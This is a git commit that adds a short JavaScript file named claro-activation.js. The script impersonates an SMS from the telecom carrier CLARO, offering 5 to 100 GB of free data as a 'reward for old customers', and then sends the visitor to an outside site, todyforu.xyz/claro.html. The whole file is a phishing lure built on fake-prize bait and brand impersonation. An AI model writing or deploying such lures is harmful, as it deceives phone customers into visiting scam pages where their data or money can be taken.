75d5f227ebe290895947f9b747fbf09c3575ac71
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-11-17 15:05:46 -0800

    Create claro-activation.js

---
+++ claro-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('CLARO SMS: Estimado cliente, verifique si su tarjeta SIM CLARO califica para recibir de 5 GB a 100 GB de datos, Recompensa para clientes antiguos, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://todyforu.xyz/claro.html';
+}
